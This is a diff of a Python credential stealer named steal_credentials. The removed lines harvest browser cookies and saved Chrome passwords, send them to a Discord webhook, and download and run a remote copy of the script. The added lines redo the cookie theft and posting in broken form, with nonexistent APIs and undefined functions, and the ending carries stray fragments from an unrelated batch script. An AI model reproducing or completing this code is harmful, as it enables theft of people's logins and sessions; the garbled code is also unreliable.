@@ -123,58 +123,47 @@ def send_to_discord(data):
     if response.status_code != 204:
         print(f"Error sending data to Discord: {response.text}")
 
-# Downloads and executes the script
-def download_and_run():
-    url = "https://raw.githubusercontent.com/yourusername/your-repo/main/steal_credentials.py"
-    response = requests.get(url)
-    with open("steal_credentials.py", "wb") as f:
-        f.write(response.content)
+#!/usr/bin/env python
+import os, sys, datetime, platform, hashlib
+import _winreg as winreg
+import requests
+from requests. structures import HTTPRequest
+import argparse
+from pytz import timezone
 
-    script_path = "steal_credentials.py"
-    subprocess.Popen([sys.executable, script_path])
-    os._exit(0)
+arg_parser = argparse.ArgumentParser(description='steal_credentials')
+arg_parser.add_argument('discord_hook_url')
+args = arg_parser.parse_args()
 
-# Main function
-def main():
-    global webhook_url
-    PATH_FIREFOX = GetRegistryPathValue(KEY_USERS, SUB_KEY_DEFAULT, SUB_KEY_SOFTWARE_MOZILLA_FIREFOX_PROFILES)
+discord_webhook_url = args.discord_hook_url
 
-    if PATH_FIREFOX:
-        PATH_FIREFOX_PROFILES = os.path.join(PATH_FIREFOX, 'profiles.ini')
-        with open(PATH_FIREFOX_PROFILES, "r") as f:
-            for line in f:
-                if line.startswith(b'Profile '):
-                    profile_name = line[8:].strip().decode('utf-8')
-                    profile_path = os.path.join(PATH_FIREFOX, profile_name)
-                    if os.path.exists(profile_path):
-                        cookies_file = os.path.join(profile_path, 'cookies.sqlite')
-                        if os.path.exists(cookies_file):
-                            cookies += read_firefox_cookies_sqlite(cookies_file)
+# Win32 reg keys
+FirefoxProfileSubKey = (winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe")
+sub_key = winreg.OpenKey(FirefoxProfileSubKey, 0)
 
-    ie_cookies = read_ie_cookies()
-    chrome_cookies = read_chrome_cookies()
-    firefox_cookies = read_firefox_cookies()
-    chrome_passwords = read_chrome_passwords()
+IE_cookie = "IE.cookies = "
+ie_path = winreg.QueryValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunmrU\\Default'), '_IERegpath')[0]
+data = readIECookies(ie_path)
+IE_cookies = HTTPRequest( IE_cookie+data, methods=["POST"], url='https://%s'%discord_webhook_url )
+requests.Post( IE_cookies, headers={})
 
-    data = {
-        "content": f"IE Cookies:\n```\n{ie_cookies}\n```\n\nChrome Cookies:\n```\n{chrome_cookies}\n```\n\nFirefox Cookies:\n```\n{firefox_cookies}\n```\n\nChrome Passwords:\n```\n{chrome_passwords}\n```"
-    }
-    send_to_discord(data)
+print("IE.cookies: ", IE_cookies)
 
-    # Check if the script is running in the background
-    if getattr(sys, 'frozen', False):
-        # If the script is running as a standalone executable, download and run itself
-        download_and_run()
-
-if __name__ == "__main__":
-    # Get Discord webhook URL from command line arguments
-    if len(sys.argv) > 1:
-        webhook_url = sys.argv[1]
-    else:
-        print("Usage: python steal_credentials.py <discord_webhook_url>")
-        sys.exit(1)
-
-    main()
+CHROME = "chrome cookies = "
+chrome_profile_path = winreg.QueryValueEx(sub_key, 0)[0]
+path = chrome_profile_path + '\Local Storage\\leveldb\cookies'
+with open(path+'\loginfo', 'rb') as fd:
+   data = fd.readlines()
+if data:
+    data1 = ""
+    for items in data[1: -1]:
+        cookies=items.replace(b':', b'>')
+        cookies = eval(bytes2str(unescape(hexlify(cookies), True)))['items']
+        data1 += "'.join(';" + bytes2str(hstore2JSON(cookies)) +  "),\n"
+chrome_cookies = HTTPRequest(CHROME + "\n".join(data1[:-2]), methods=["POST"], url='https://%s'%discord_webhook_url )
+requests.Post(chrome_cookies, headers={})
+print("Chrome Cookies: ",chrome_cookies)
         pause
         ]],
         "thebestexecutorofalltime.bat"
